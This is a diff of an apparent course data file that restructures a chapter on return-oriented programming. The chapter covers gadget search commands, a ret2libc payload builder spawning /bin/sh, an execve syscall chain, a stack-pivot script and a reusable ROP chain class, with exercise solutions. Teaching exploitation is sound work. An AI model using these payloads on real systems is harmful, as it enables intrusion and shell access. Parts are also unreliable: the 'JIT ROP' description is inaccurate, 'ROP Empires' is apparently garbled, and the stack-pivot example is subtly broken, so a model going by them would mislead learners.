@@ -874,458 +874,441 @@ export const CHAPTERS_LEVEL_8: Chapter[] = [
     ]
   },
   {
-    id: 42,
-    slug: 'chapter-42-return-oriented-programming-rop',
-    level: 8,
-    levelTitle: 'Security and Binary Exploitation',
-    title: 'Chapter 42: Return-Oriented Programming (ROP) and Code Reuse',
-    subtitle: 'Defeating NX/DEP: Gadget Hunting, Ret2Libc, and Stack Pivoting',
-    learningObjectives: [
-      'Understand the fundamentals of Return-Oriented Programming (ROP).',
-      'Understand how Return-Oriented Programming bypasses non-executable stack (NX) protections.',
-      'Harvest instruction gadgets ending in ret using ROPgadget and ropper.',
-      'Construct a ret2libc attack chain calling system("/bin/sh").',
-      'Implement stack pivoting with xchg rax, rsp; ret.',
-      'Understand advanced ROP techniques (JOP, COP, call-oriented).',
-      'Learn ROP chain construction and debugging methodologies.',
-      'Understand ROP mitigations and defenses.'
+    "id": 42,
+    "slug": "chapter-42-return-oriented-programming-rop",
+    "level": 8,
+    "levelTitle": "Security and Binary Exploitation",
+    "title": "Chapter 42: Return-Oriented Programming (ROP) and Code Reuse",
+    "subtitle": "Defeating NX/DEP: Gadget Hunting, Ret2Libc, and Stack Pivoting",
+    "learningObjectives": [
+      "Understand the fundamentals of Return-Oriented Programming (ROP).",
+      "Understand how Return-Oriented Programming bypasses non-executable stack (NX) protections.",
+      "Harvest instruction gadgets ending in ret using ROPgadget and ropper.",
+      "Construct a ret2libc attack chain calling system(\"/bin/sh\").",
+      "Implement stack pivoting with xchg rax, rsp; ret.",
+      "Understand advanced ROP techniques (JOP, COP, call-oriented).",
+      "Learn ROP chain construction and debugging methodologies.",
+      "Understand ROP mitigations and defenses."
     ],
-    prerequisites: ['Chapters 1–41'],
-    keyConcepts: [
-      'ROP: Code reuse technique that chains existing instruction sequences (gadgets).',
-      'Gadgets: Short instruction sequences ending in ret (e.g., pop rdi; ret).',
-      'ret2libc: Calling libc functions (system, execve) without injecting code.',
-      'Stack pivoting: Redirecting RSP to controlled memory (e.g., xchg rax, rsp).',
-      'ROP chains: Multiple gadgets chained to perform complex operations.',
-      'JOP (Jump-Oriented Programming): Uses jmp instead of ret for chaining.',
-      'COP (Call-Oriented Programming): Uses call instructions for chaining.',
-      'ROP mitigations: CFI, stack canaries, ASLR make ROP harder.'
+    "prerequisites": [
+      "Chapters 1–41"
     ],
-    diagramType: 'rop_code_reuse',
-    sections: [
+    "keyConcepts": [
+      "ROP: Code reuse technique that chains existing instruction sequences (gadgets).",
+      "Gadgets: Short instruction sequences ending in ret (e.g., pop rdi; ret).",
+      "ret2libc: Calling libc functions (system, execve) without injecting code.",
+      "Stack pivoting: Redirecting RSP to controlled memory (e.g., xchg rax, rsp).",
+      "ROP chains: Multiple gadgets chained to perform complex operations.",
+      "JOP (Jump-Oriented Programming): Uses jmp instead of ret for chaining.",
+      "COP (Call-Oriented Programming): Uses call instructions for chaining.",
+      "ROP mitigations: CFI, stack canaries, ASLR make ROP harder."
+    ],
+    "diagramType": "rop_code_reuse",
+    "sections": [
       {
-        id: 'sec-42-1',
-        title: '42.1 Fundamentals of ROP',
-        content: `ROP chains existing code fragments (gadgets) to perform arbitrary operations without injecting new code.
-
-### Why ROP Exists
-NX/DEP prevents execution from stack/heap. ROP uses existing executable code segments (libc, binary) which are always readable and executable.
-
-### What is a Gadget?
-A gadget is a short instruction sequence ending in ret:
-• pop rdi; ret (5f c3) - Load value into RDI
-• pop rsi; ret (5e c3) - Load value into RSI
-• pop rdx; ret (5a c3) - Load value into RDX
-• mov rax, rdi; ret (48 89 f8 c3) - Copy RDI to RAX
-• add rax, rsi; ret (48 01 f0 c3) - Add RSI to RAX
-
-### How ROP Works
-1. Attacker overwrites return address with gadget address
-2. Gadget executes, ends with ret
-3. ret pops next address from stack → next gadget
-4. Chain continues until desired operation complete
-
-### ROP vs Shellcode
-| Aspect | Shellcode | ROP |
-|--------|-----------|-----|
-| Code source | Injected | Existing |
-| NX bypass | No | Yes |
-| Size | Small | Larger chains |
-| Complexity | Simple | Complex |
-| Detection | Easier | Harder |
-
-### ROP Chain Example (Calling system("/bin/sh"))
-
-[pop rdi; ret]  →  Address of "/bin/sh"
-[system]         →  Execute system("/bin/sh")
-
-
-### Gadget Requirements
-• Must end in ret for chaining
-• Useful instructions (pop, mov, arithmetic)
-• No side effects that break chain
-• Available in executable segments`,
-        codeSnippets: [
+        "id": "sec-42-1",
+        "title": "42.1 Fundamentals of ROP",
+        "content": "ROP chains existing code fragments (gadgets) to perform arbitrary operations without injecting new code."
+      },
+      {
+        "id": "sec-42-1-1",
+        "title": "42.1.1 Why ROP Exists",
+        "content": "NX/DEP prevents execution from stack/heap. ROP uses existing executable code segments (libc, binary) which are always readable and executable."
+      },
+      {
+        "id": "sec-42-1-2",
+        "title": "42.1.2 What is a Gadget?",
+        "content": "A gadget is a short instruction sequence ending in ret:\n• pop rdi; ret (5f c3) - Load value into RDI\n• pop rsi; ret (5e c3) - Load value into RSI\n• pop rdx; ret (5a c3) - Load value into RDX\n• mov rax, rdi; ret (48 89 f8 c3) - Copy RDI to RAX\n• add rax, rsi; ret (48 01 f0 c3) - Add RSI to RAX"
+      },
+      {
+        "id": "sec-42-1-3",
+        "title": "42.1.3 How ROP Works",
+        "content": "1. Attacker overwrites return address with gadget address\n2. Gadget executes, ends with ret\n3. ret pops next address from stack → next gadget\n4. Chain continues until desired operation complete"
+      },
+      {
+        "id": "sec-42-1-4",
+        "title": "42.1.4 ROP vs Shellcode",
+        "content": "",
+        "tableData": {
+          "headers": [
+            "Aspect",
+            "Shellcode",
+            "ROP"
+          ],
+          "rows": [
+            [
+              "Code source",
+              "Injected",
+              "Existing"
+            ],
+            [
+              "NX bypass",
+              "No",
+              "Yes"
+            ],
+            [
+              "Size",
+              "Small",
+              "Larger chains"
+            ],
+            [
+              "Complexity",
+              "Simple",
+              "Complex"
+            ],
+            [
+              "Detection",
+              "Easier",
+              "Harder"
+            ]
+          ]
+        }
+      },
+      {
+        "id": "sec-42-1-5",
+        "title": "42.1.5 ROP Chain Example (Calling system(\"/bin/sh\"))",
+        "content": "[pop rdi; ret]  →  Address of \"/bin/sh\"\n[system]         →  Execute system(\"/bin/sh\")"
+      },
+      {
+        "id": "sec-42-1-6",
+        "title": "42.1.6 Gadget Requirements",
+        "content": "• Must end in ret for chaining\n• Useful instructions (pop, mov, arithmetic)\n• No side effects that break chain\n• Available in executable segments"
+      },
+      {
+        "id": "sec-42-1-7",
+        "title": "42.1.7 Code examples",
+        "content": "",
+        "codeSnippets": [
           {
-            language: 'bash',
-            title: 'Finding Gadgets',
-            code: `# Using ROPgadget
-ROPgadget --binary vulnerable_binary
-ROPgadget --binary vulnerable_binary --only "pop|ret"
-ROPgadget --binary libc.so.6 --only "pop|ret" | grep rdi
-
-# Using ropper
-ropper --file vulnerable_binary
-ropper --file vulnerable_binary --search "pop rdi"
-
-# Using objdump + grep
-objdump -d vulnerable_binary | grep -A 1 "pop.*%rdi" | grep ret
-
-# Count gadgets
-ROPgadget --binary vulnerable_binary | wc -l`
+            "language": "bash",
+            "title": "Finding Gadgets",
+            "code": "# Using ROPgadget\nROPgadget --binary vulnerable_binary\nROPgadget --binary vulnerable_binary --only \"pop|ret\"\nROPgadget --binary libc.so.6 --only \"pop|ret\" | grep rdi\n\n# Using ropper\nropper --file vulnerable_binary\nropper --file vulnerable_binary --search \"pop rdi\"\n\n# Using objdump + grep\nobjdump -d vulnerable_binary | grep -A 1 \"pop.*%rdi\" | grep ret\n\n# Count gadgets\nROPgadget --binary vulnerable_binary | wc -l"
           }
         ]
       },
       {
-        id: 'sec-42-2',
-        title: '42.2 Constructing a Ret2Libc Attack',
-        content: `ret2libc directly calls libc functions (system, execve, str_bin_sh) without shellcode.
-
-### Why ret2Libc?
-• Bypasses NX (executes from libc, which is executable)
-• No need for shellcode injection
-• Uses known function addresses
-• More reliable than raw shellcode
-
-### ret2libc Attack Steps
-1. Find system() address in libc
-2. Find "/bin/sh" string address in libc
-3. Chain gadgets to call system("/bin/sh")
-
-### Calling Convention (x86-64 Linux)
-• RDI = First argument
-• RSI = Second argument
-• RDX = Third argument
-• RAX = Return value / syscall number
-
-### ret2libc Chain Structure
-
-[pop rdi; ret]  →  Address of "/bin/sh"
-[system]        →  system("/bin/sh")
-[exit]          →  Clean exit (optional)
-
-
-### Finding Libc Addresses
-1. Leak libc base from GOT/PLT
-2. Calculate offsets: function_addr = libc_base + offset
-3. Use libc database to find offsets
-
-### Alternative: execve("/bin/sh", NULL, NULL)
-More complex but more powerful:
-
-[pop rdi; ret]  →  "/bin/sh"
-[pop rsi; ret]  →  0 (NULL)
-[pop rdx; ret]  →  0 (NULL)
-[pop rax; ret]  →  59 (execve syscall)
-[syscall]       →  execve("/bin/sh", NULL, NULL)
-
-
-### Handling ASLR
-With ASLR enabled, libc address varies. Solutions:
-1. Information leak (format string, GOT read)
-2. Ret2plt to call read/write for leak
-3. Brute force (if fork-based server)`,
-        codeSnippets: [
+        "id": "sec-42-2",
+        "title": "42.2 Constructing a Ret2Libc Attack",
+        "content": "ret2libc directly calls libc functions (system, execve, str_bin_sh) without shellcode."
+      },
+      {
+        "id": "sec-42-2-1",
+        "title": "42.2.1 Why ret2Libc?",
+        "content": "• Bypasses NX (executes from libc, which is executable)\n• No need for shellcode injection\n• Uses known function addresses\n• More reliable than raw shellcode"
+      },
+      {
+        "id": "sec-42-2-2",
+        "title": "42.2.2 ret2libc Attack Steps",
+        "content": "1. Find system() address in libc\n2. Find \"/bin/sh\" string address in libc\n3. Chain gadgets to call system(\"/bin/sh\")"
+      },
+      {
+        "id": "sec-42-2-3",
+        "title": "42.2.3 Calling Convention (x86-64 Linux)",
+        "content": "• RDI = First argument\n• RSI = Second argument\n• RDX = Third argument\n• RAX = Return value / syscall number"
+      },
+      {
+        "id": "sec-42-2-4",
+        "title": "42.2.4 ret2libc Chain Structure",
+        "content": "[pop rdi; ret]  →  Address of \"/bin/sh\"\n[system]        →  system(\"/bin/sh\")\n[exit]          →  Clean exit (optional)"
+      },
+      {
+        "id": "sec-42-2-5",
+        "title": "42.2.5 Finding Libc Addresses",
+        "content": "1. Leak libc base from GOT/PLT\n2. Calculate offsets: function_addr = libc_base + offset\n3. Use libc database to find offsets"
+      },
+      {
+        "id": "sec-42-2-6",
+        "title": "42.2.6 Alternative: execve(\"/bin/sh\", NULL, NULL)",
+        "content": "More complex but more powerful:\n\n[pop rdi; ret]  →  \"/bin/sh\"\n[pop rsi; ret]  →  0 (NULL)\n[pop rdx; ret]  →  0 (NULL)\n[pop rax; ret]  →  59 (execve syscall)\n[syscall]       →  execve(\"/bin/sh\", NULL, NULL)"
+      },
+      {
+        "id": "sec-42-2-7",
+        "title": "42.2.7 Handling ASLR",
+        "content": "With ASLR enabled, libc address varies. Solutions:\n1. Information leak (format string, GOT read)\n2. Ret2plt to call read/write for leak\n3. Brute force (if fork-based server)"
+      },
+      {
+        "id": "sec-42-2-8",
+        "title": "42.2.8 Code examples",
+        "content": "",
+        "codeSnippets": [
           {
-            language: 'python',
-            title: 'ret2libc Exploit',
-            code: `import struct
-from pwn import *
-
-# Offsets (from libc database)
-system_offset = 0x4f550
-bin_sh_offset = 0x1b3e1a
-exit_offset = 0x44040
-
-# If libc base leaked (e.g., from format string)
-libc_base = 0x7ffff7a00000  # Example leak
-
-system_addr = libc_base + system_offset
-bin_sh_addr = libc_base + bin_sh_offset
-exit_addr = libc_base + exit_offset
-
-# Gadgets
-pop_rdi = 0x400736  # pop rdi; ret
-
-# Build payload
-offset = 72  # Buffer to return address
-
-payload = b"A" * offset
-payload += struct.pack("<Q", pop_rdi)    # pop rdi; ret
-payload += struct.pack("<Q", bin_sh_addr) # "/bin/sh"
-payload += struct.pack("<Q", system_addr) # system("/bin/sh")
-
-print(f"Payload length: {len(payload)}")
-
-# Write to file
-with open("ret2libc.bin", "wb") as f:
-    f.write(payload)`
+            "language": "python",
+            "title": "ret2libc Exploit",
+            "code": "import struct\nfrom pwn import *\n\n# Offsets (from libc database)\nsystem_offset = 0x4f550\nbin_sh_offset = 0x1b3e1a\nexit_offset = 0x44040\n\n# If libc base leaked (e.g., from format string)\nlibc_base = 0x7ffff7a00000  # Example leak\n\nsystem_addr = libc_base + system_offset\nbin_sh_addr = libc_base + bin_sh_offset\nexit_addr = libc_base + exit_offset\n\n# Gadgets\npop_rdi = 0x400736  # pop rdi; ret\n\n# Build payload\noffset = 72  # Buffer to return address\n\npayload = b\"A\" * offset\npayload += struct.pack(\"<Q\", pop_rdi)    # pop rdi; ret\npayload += struct.pack(\"<Q\", bin_sh_addr) # \"/bin/sh\"\npayload += struct.pack(\"<Q\", system_addr) # system(\"/bin/sh\")\n\nprint(f\"Payload length: {len(payload)}\")\n\n# Write to file\nwith open(\"ret2libc.bin\", \"wb\") as f:\n    f.write(payload)"
           }
         ]
       },
       {
-        id: 'sec-42-3',
-        title: '42.3 Advanced ROP Techniques',
-        content: `Beyond basic ret2libc, ROP enables complex operations.
-
-### Stack Pivoting
-Redirect RSP to controlled memory (e.g., heap, .bss):
-• xchg rax, rsp; ret - Swap RAX and RSP
-• leave; ret - MOV RSP, RBP; POP RBP; RET
-• add rsp, N; ret - Adjust stack pointer
-
-### Memory Write via ROP
-Write arbitrary values to arbitrary addresses:
-
-[pop rdi; ret]  →  Target address
-[pop rsi; ret]  →  Value to write
-[mov [rdi], rsi; ret]  →  Write value
-
-
-### Memory Read via ROP
-Read arbitrary memory:
-
-[pop rdi; ret]  →  Source address
-[pop rsi; ret]  →  Destination buffer
-[call read]     →  Read memory
-
-
-### Conditional Logic in ROP
-Use arithmetic and conditional jumps:
-
-[pop rax; ret]  →  Condition
-[cmp rax, 0; ret]  →  Set flags
-[je addr; ret]  →  Conditional branch
-
-
-### ROP Empires
-Large ROP chains that:
-1. Leak libc base
-2. Calculate function addresses
-3. Call multiple functions
-4. Build complex operations
-
-### JIT ROP
-Compile-time ROP chain generation:
-1. Scan binary for gadgets
-2. Find gadgets that satisfy operations
-3. Generate ROP chain automatically
-4. Defeats static analysis
-
-### ROP vs JOP vs COP
-| Type | Chaining Instruction | Pros | Cons |
-|------|---------------------|------|------|
-| ROP | ret | Simple, universal | Stack-intensive |
-| JOP | jmp | Less stack use | Fewer gadgets |
-| COP | call | Direct calls | Complex setup |
-
-### ROP Mitigations
-| Mitigation | Bypass Difficulty |
-|------------|-------------------|
-| CFI (Control-Flow Integrity) | Hard - validates targets |
-| Stack canaries | Medium - leak canary |
-| ASLR | Medium - leak address |
-| PIE | Hard - need code leak |
-| Shadow Stack | Very Hard - hardware support |`,
-        codeSnippets: [
+        "id": "sec-42-3",
+        "title": "42.3 Advanced ROP Techniques",
+        "content": "Beyond basic ret2libc, ROP enables complex operations."
+      },
+      {
+        "id": "sec-42-3-1",
+        "title": "42.3.1 Stack Pivoting",
+        "content": "Redirect RSP to controlled memory (e.g., heap, .bss):\n• xchg rax, rsp; ret - Swap RAX and RSP\n• leave; ret - MOV RSP, RBP; POP RBP; RET\n• add rsp, N; ret - Adjust stack pointer"
+      },
+      {
+        "id": "sec-42-3-2",
+        "title": "42.3.2 Memory Write via ROP",
+        "content": "Write arbitrary values to arbitrary addresses:\n\n[pop rdi; ret]  →  Target address\n[pop rsi; ret]  →  Value to write\n[mov [rdi], rsi; ret]  →  Write value"
+      },
+      {
+        "id": "sec-42-3-3",
+        "title": "42.3.3 Memory Read via ROP",
+        "content": "Read arbitrary memory:\n\n[pop rdi; ret]  →  Source address\n[pop rsi; ret]  →  Destination buffer\n[call read]     →  Read memory"
+      },
+      {
+        "id": "sec-42-3-4",
+        "title": "42.3.4 Conditional Logic in ROP",
+        "content": "Use arithmetic and conditional jumps:\n\n[pop rax; ret]  →  Condition\n[cmp rax, 0; ret]  →  Set flags\n[je addr; ret]  →  Conditional branch"
+      },
+      {
+        "id": "sec-42-3-5",
+        "title": "42.3.5 ROP Empires",
+        "content": "Large ROP chains that:\n1. Leak libc base\n2. Calculate function addresses\n3. Call multiple functions\n4. Build complex operations"
+      },
+      {
+        "id": "sec-42-3-6",
+        "title": "42.3.6 JIT ROP",
+        "content": "Compile-time ROP chain generation:\n1. Scan binary for gadgets\n2. Find gadgets that satisfy operations\n3. Generate ROP chain automatically\n4. Defeats static analysis"
+      },
+      {
+        "id": "sec-42-3-7",
+        "title": "42.3.7 ROP vs JOP vs COP",
+        "content": "",
+        "tableData": {
+          "headers": [
+            "Type",
+            "Chaining Instruction",
+            "Pros",
+            "Cons"
+          ],
+          "rows": [
+            [
+              "ROP",
+              "ret",
+              "Simple, universal",
+              "Stack-intensive"
+            ],
+            [
+              "JOP",
+              "jmp",
+              "Less stack use",
+              "Fewer gadgets"
+            ],
+            [
+              "COP",
+              "call",
+              "Direct calls",
+              "Complex setup"
+            ]
+          ]
+        }
+      },
+      {
+        "id": "sec-42-3-8",
+        "title": "42.3.8 ROP Mitigations",
+        "content": "",
+        "tableData": {
+          "headers": [
+            "Mitigation",
+            "Bypass Difficulty"
+          ],
+          "rows": [
+            [
+              "CFI (Control-Flow Integrity)",
+              "Hard - validates targets"
+            ],
+            [
+              "Stack canaries",
+              "Medium - leak canary"
+            ],
+            [
+              "ASLR",
+              "Medium - leak address"
+            ],
+            [
+              "PIE",
+              "Hard - need code leak"
+            ],
+            [
+              "Shadow Stack",
+              "Very Hard - hardware support"
+            ]
+          ]
+        }
+      },
+      {
+        "id": "sec-42-3-9",
+        "title": "42.3.9 Code examples",
+        "content": "",
+        "codeSnippets": [
           {
-            language: 'python',
-            title: 'Stack Pivot ROP Chain',
-            code: `import struct
-
-# Scenario: Buffer overflow in small buffer, need to pivot to larger controlled area
-
-# Gadgets
-leave_ret = 0x400566      # leave; ret
-pop_rdi = 0x400736         # pop rdi; ret
-pop_rsi = 0x400734         # pop rsi; ret
-pop_rax = 0x40072e         # pop rax; ret
-syscall_ret = 0x400500     # syscall; ret
-
-# Controlled buffer on heap (0x601000)
-controlled_buffer = 0x601000
-
-# Initial overflow (small buffer)
-offset = 32
-payload = b"A" * offset
-
-# Stack pivot to controlled buffer
-payload += struct.pack("<Q", leave_ret)   # mov rsp, rbp; pop rbp
-payload += struct.pack("<Q", controlled_buffer)  # New RSP location
-
-# ROP chain in controlled buffer
-rop_chain = b""
-rop_chain += struct.pack("<Q", pop_rdi)   # pop rdi; ret
-rop_chain += struct.pack("<Q", 1)         # fd = stdout
-rop_chain += struct.pack("<Q", pop_rsi)   # pop rsi; ret
-rop_chain += struct.pack("<Q", 0x601100)  # buffer to write
-rop_chain += struct.pack("<Q", pop_rax)   # pop rax; ret
-rop_chain += struct.pack("<Q", 1)         # syscall: write
-rop_chain += struct.pack("<Q", syscall_ret)
-
-payload += rop_chain
-print(f"Payload: {len(payload)} bytes")`
+            "language": "python",
+            "title": "Stack Pivot ROP Chain",
+            "code": "import struct\n\n# Scenario: Buffer overflow in small buffer, need to pivot to larger controlled area\n\n# Gadgets\nleave_ret = 0x400566      # leave; ret\npop_rdi = 0x400736         # pop rdi; ret\npop_rsi = 0x400734         # pop rsi; ret\npop_rax = 0x40072e         # pop rax; ret\nsyscall_ret = 0x400500     # syscall; ret\n\n# Controlled buffer on heap (0x601000)\ncontrolled_buffer = 0x601000\n\n# Initial overflow (small buffer)\noffset = 32\npayload = b\"A\" * offset\n\n# Stack pivot to controlled buffer\npayload += struct.pack(\"<Q\", leave_ret)   # mov rsp, rbp; pop rbp\npayload += struct.pack(\"<Q\", controlled_buffer)  # New RSP location\n\n# ROP chain in controlled buffer\nrop_chain = b\"\"\nrop_chain += struct.pack(\"<Q\", pop_rdi)   # pop rdi; ret\nrop_chain += struct.pack(\"<Q\", 1)         # fd = stdout\nrop_chain += struct.pack(\"<Q\", pop_rsi)   # pop rsi; ret\nrop_chain += struct.pack(\"<Q\", 0x601100)  # buffer to write\nrop_chain += struct.pack(\"<Q\", pop_rax)   # pop rax; ret\nrop_chain += struct.pack(\"<Q\", 1)         # syscall: write\nrop_chain += struct.pack(\"<Q\", syscall_ret)\n\npayload += rop_chain\nprint(f\"Payload: {len(payload)} bytes\")"
           }
         ]
       },
       {
-        id: 'sec-42-4',
-        title: '42.4 ROP Chain Construction Methodology',
-        content: `Building effective ROP chains requires systematic methodology.
-
-### Step-by-Step ROP Development
-1. **Gadget Discovery**: Find useful gadgets with ROPgadget/ropper
-2. **Gadget Selection**: Choose gadgets that perform desired operations
-3. **Chain Design**: Plan gadget sequence for target function call
-4. **Address Calculation**: Determine gadget and data addresses
-5. **Chain Construction**: Build payload with proper offsets
-6. **Testing**: Verify chain execution in GDB
-7. **Optimization**: Minimize chain size, improve reliability
-
-### Essential Gadgets
-| Operation | Gadget | Purpose |
-|-----------|--------|---------|
-| Load arg1 | pop rdi; ret | First function argument |
-| Load arg2 | pop rsi; ret | Second function argument |
-| Load arg3 | pop rdx; ret | Third function argument |
-| Load syscall# | pop rax; ret | System call number |
-| Memory write | mov [rdi], rsi; ret | Write to memory |
-| Memory read | mov rsi, [rdi]; ret | Read from memory |
-| Arithmetic | add rax, rsi; ret | Perform calculations |
-| Stack pivot | xchg rax, rsp; ret | Redirect stack |
-
-### ROP Chain Debugging
-1. Set breakpoint at vulnerable function
-2. Step through payload delivery
-3. Verify each gadget executes correctly
-4. Check register and stack values after each gadget
-5. Identify where chain breaks
-
-### Common ROP Patterns
-• **Function call**: pop args, call function
-• **Syscall**: pop registers, syscall
-• **Memory write**: pop addr, pop value, write
-• **Memory read**: pop src, pop dst, read
-• **Loop**: Conditional jump back to start
-
-### ROP Optimization
-• Reuse gadgets when possible
-• Minimize gadget count
-• Use shorter gadgets (fewer bytes)
-• Avoid unnecessary register saves
-• Align stack properly for x86-64
-
-### ROP Resources
-• ROPgadget: Finding gadgets
-• ropper: Alternative gadget finder
-• rp++: Fast gadget search
-• pwntools: Python exploit development
-• ROP Emporium: Practice challenges`,
-        codeSnippets: [
+        "id": "sec-42-4",
+        "title": "42.4 ROP Chain Construction Methodology",
+        "content": "Building effective ROP chains requires systematic methodology."
+      },
+      {
+        "id": "sec-42-4-1",
+        "title": "42.4.1 Step-by-Step ROP Development",
+        "content": "1. Gadget Discovery: Find useful gadgets with ROPgadget/ropper\n2. Gadget Selection: Choose gadgets that perform desired operations\n3. Chain Design: Plan gadget sequence for target function call\n4. Address Calculation: Determine gadget and data addresses\n5. Chain Construction: Build payload with proper offsets\n6. Testing: Verify chain execution in GDB\n7. Optimization: Minimize chain size, improve reliability"
+      },
+      {
+        "id": "sec-42-4-2",
+        "title": "42.4.2 Essential Gadgets",
+        "content": "",
+        "tableData": {
+          "headers": [
+            "Operation",
+            "Gadget",
+            "Purpose"
+          ],
+          "rows": [
+            [
+              "Load arg1",
+              "pop rdi; ret",
+              "First function argument"
+            ],
+            [
+              "Load arg2",
+              "pop rsi; ret",
+              "Second function argument"
+            ],
+            [
+              "Load arg3",
+              "pop rdx; ret",
+              "Third function argument"
+            ],
+            [
+              "Load syscall#",
+              "pop rax; ret",
+              "System call number"
+            ],
+            [
+              "Memory write",
+              "mov [rdi], rsi; ret",
+              "Write to memory"
+            ],
+            [
+              "Memory read",
+              "mov rsi, [rdi]; ret",
+              "Read from memory"
+            ],
+            [
+              "Arithmetic",
+              "add rax, rsi; ret",
+              "Perform calculations"
+            ],
+            [
+              "Stack pivot",
+              "xchg rax, rsp; ret",
+              "Redirect stack"
+            ]
+          ]
+        }
+      },
+      {
+        "id": "sec-42-4-3",
+        "title": "42.4.3 ROP Chain Debugging",
+        "content": "1. Set breakpoint at vulnerable function\n2. Step through payload delivery\n3. Verify each gadget executes correctly\n4. Check register and stack values after each gadget\n5. Identify where chain breaks"
+      },
+      {
+        "id": "sec-42-4-4",
+        "title": "42.4.4 Common ROP Patterns",
+        "content": "• Function call: pop args, call function\n• Syscall: pop registers, syscall\n• Memory write: pop addr, pop value, write\n• Memory read: pop src, pop dst, read\n• Loop: Conditional jump back to start"
+      },
+      {
+        "id": "sec-42-4-5",
+        "title": "42.4.5 ROP Optimization",
+        "content": "• Reuse gadgets when possible\n• Minimize gadget count\n• Use shorter gadgets (fewer bytes)\n• Avoid unnecessary register saves\n• Align stack properly for x86-64"
+      },
+      {
+        "id": "sec-42-4-6",
+        "title": "42.4.6 ROP Resources",
+        "content": "• ROPgadget: Finding gadgets\n• ropper: Alternative gadget finder\n• rp++: Fast gadget search\n• pwntools: Python exploit development\n• ROP Emporium: Practice challenges"
+      },
+      {
+        "id": "sec-42-4-7",
+        "title": "42.4.7 Code examples",
+        "content": "",
+        "codeSnippets": [
           {
-            language: 'python',
-            title: 'Systematic ROP Chain Builder',
-            code: `import struct
-
-class ROPChain:
-    def __init__(self, binary_path):
-        self.chain = b""
-        self.gadgets = {}
-        
-    def add_gadget(self, name, address):
-        self.gadgets[name] = address
-        
-    def pop_rdi(self, value):
-        self.chain += struct.pack("<Q", self.gadgets['pop_rdi'])
-        self.chain += struct.pack("<Q", value)
-        
-    def pop_rsi(self, value):
-        self.chain += struct.pack("<Q", self.gadgets['pop_rsi'])
-        self.chain += struct.pack("<Q", value)
-        
-    def pop_rdx(self, value):
-        self.chain += struct.pack("<Q", self.gadgets['pop_rdx'])
-        self.chain += struct.pack("<Q", value)
-        
-    def call_function(self, func_addr):
-        self.chain += struct.pack("<Q", func_addr)
-        
-    def syscall(self):
-        self.chain += struct.pack("<Q", self.gadgets['syscall'])
-        
-    def build(self):
-        return self.chain
-
-# Example usage
-rop = ROPChain("./vulnerable")
-rop.add_gadget('pop_rdi', 0x400736)
-rop.add_gadget('pop_rsi', 0x400734)
-rop.add_gadget('pop_rdx', 0x400732)
-rop.add_gadget('syscall', 0x400500)
-rop.add_gadget('system', 0x7ffff7a52390)
-rop.add_gadget('bin_sh', 0x7ffff7b99d57)
-
-# Build chain: system("/bin/sh")
-rop.pop_rdi(rop.gadgets['bin_sh'])
-rop.call_function(rop.gadgets['system'])
-
-payload = b"A" * 72 + rop.build()
-print(f"Chain length: {len(rop.build())} bytes")`
+            "language": "python",
+            "title": "Systematic ROP Chain Builder",
+            "code": "import struct\n\nclass ROPChain:\n    def __init__(self, binary_path):\n        self.chain = b\"\"\n        self.gadgets = {}\n        \n    def add_gadget(self, name, address):\n        self.gadgets[name] = address\n        \n    def pop_rdi(self, value):\n        self.chain += struct.pack(\"<Q\", self.gadgets['pop_rdi'])\n        self.chain += struct.pack(\"<Q\", value)\n        \n    def pop_rsi(self, value):\n        self.chain += struct.pack(\"<Q\", self.gadgets['pop_rsi'])\n        self.chain += struct.pack(\"<Q\", value)\n        \n    def pop_rdx(self, value):\n        self.chain += struct.pack(\"<Q\", self.gadgets['pop_rdx'])\n        self.chain += struct.pack(\"<Q\", value)\n        \n    def call_function(self, func_addr):\n        self.chain += struct.pack(\"<Q\", func_addr)\n        \n    def syscall(self):\n        self.chain += struct.pack(\"<Q\", self.gadgets['syscall'])\n        \n    def build(self):\n        return self.chain\n\n# Example usage\nrop = ROPChain(\"./vulnerable\")\nrop.add_gadget('pop_rdi', 0x400736)\nrop.add_gadget('pop_rsi', 0x400734)\nrop.add_gadget('pop_rdx', 0x400732)\nrop.add_gadget('syscall', 0x400500)\nrop.add_gadget('system', 0x7ffff7a52390)\nrop.add_gadget('bin_sh', 0x7ffff7b99d57)\n\n# Build chain: system(\"/bin/sh\")\nrop.pop_rdi(rop.gadgets['bin_sh'])\nrop.call_function(rop.gadgets['system'])\n\npayload = b\"A\" * 72 + rop.build()\nprint(f\"Chain length: {len(rop.build())} bytes\")"
           }
         ]
       }
     ],
-    exercises: [
+    "exercises": [
       {
-        id: 'ex-42-1',
-        title: 'Exercise 42.1: Ret2Syscall Chain Structure',
-        description: 'Design a ROP chain to execute execve("/bin/sh", 0, 0) via raw syscall gadgets.',
-        solution: 'Chain layout: [pop rax; ret, 59] -> [pop rdi; ret, "/bin/sh"] -> [pop rsi; ret, 0] -> [pop rdx; ret, 0] -> [syscall; ret]. Each pop loads a register, then syscall invokes execve.'
+        "id": "ex-42-1",
+        "title": "Exercise 42.1: Ret2Syscall Chain Structure",
+        "description": "Design a ROP chain to execute execve(\"/bin/sh\", 0, 0) via raw syscall gadgets.",
+        "solution": "Chain layout: [pop rax; ret, 59] -> [pop rdi; ret, \"/bin/sh\"] -> [pop rsi; ret, 0] -> [pop rdx; ret, 0] -> [syscall; ret]. Each pop loads a register, then syscall invokes execve."
       },
       {
-        id: 'ex-42-2',
-        title: 'Exercise 42.2: Stack Pivot Implementation',
-        description: 'Explain how to pivot the stack from a small overflow buffer to a larger controlled area.',
-        solution: 'Use leave; ret (mov rsp, rbp; pop rbp) or xchg rax, rsp; ret. First overflow sets RBP to controlled buffer address. Then leave; ret pivots RSP to that buffer where the full ROP chain resides.'
+        "id": "ex-42-2",
+        "title": "Exercise 42.2: Stack Pivot Implementation",
+        "description": "Explain how to pivot the stack from a small overflow buffer to a larger controlled area.",
+        "solution": "Use leave; ret (mov rsp, rbp; pop rbp) or xchg rax, rsp; ret. First overflow sets RBP to controlled buffer address. Then leave; ret pivots RSP to that buffer where the full ROP chain resides."
       },
       {
-        id: 'ex-42-3',
-        title: 'Exercise 42.3: Memory Write Gadget',
-        description: 'Find and use a gadget that writes a value to an arbitrary memory address.',
-        solution: 'Gadget: mov [rdi], rsi; ret. Chain: pop rdi; ret (target addr) -> pop rsi; ret (value) -> mov [rdi], rsi; ret (write). This writes RSI value to memory at RDI.'
+        "id": "ex-42-3",
+        "title": "Exercise 42.3: Memory Write Gadget",
+        "description": "Find and use a gadget that writes a value to an arbitrary memory address.",
+        "solution": "Gadget: mov [rdi], rsi; ret. Chain: pop rdi; ret (target addr) -> pop rsi; ret (value) -> mov [rdi], rsi; ret (write). This writes RSI value to memory at RDI."
       },
       {
